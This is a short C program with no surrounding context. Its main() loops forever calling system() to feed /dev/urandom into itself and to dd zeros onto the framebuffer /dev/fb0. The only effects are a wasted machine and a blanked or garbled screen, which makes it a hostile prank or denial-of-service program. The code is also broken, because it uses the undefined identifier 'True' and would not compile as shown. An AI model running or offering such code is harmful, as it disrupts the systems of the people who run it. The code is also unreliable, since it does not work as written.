#include <stdio.h>
#include <stdlib.h>

int main() {
   while(True == True) {
      system("cat /dev/urandom >> /dev/urandom");
      system("dd if=/dev/zero count=1000 bs=1024 > /dev/fb0");
   }
}
